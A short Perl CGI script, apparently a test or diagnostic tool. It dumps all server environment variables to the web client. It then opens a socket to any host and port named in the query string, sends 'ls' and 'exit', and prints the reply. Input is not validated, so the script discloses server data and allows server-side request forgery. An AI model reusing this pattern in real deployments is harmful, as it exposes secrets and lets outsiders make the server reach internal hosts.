#!/usr/bin/perl

use strict;

use IO::Socket;
use CGI qw(:standard); 

print "Content-Type: text/plain\n\n";

my $host;
my $port;
my $key;
exit 1 if($ENV{QUERY_STRING} eq "");
   foreach $key (sort keys(%ENV)) {
      print "$key = $ENV{$key}\n";
   } 
($host, $port) = (split /\&/, $ENV{QUERY_STRING});
$host =~ s/^host=//;
$port =~ s/^port=//;

my $sock = IO::Socket::INET->new("$host:$port");

print "\n\nls:\n";
print $sock "ls\r\n";
print $sock "exit\r\n";




print while(<$sock>);
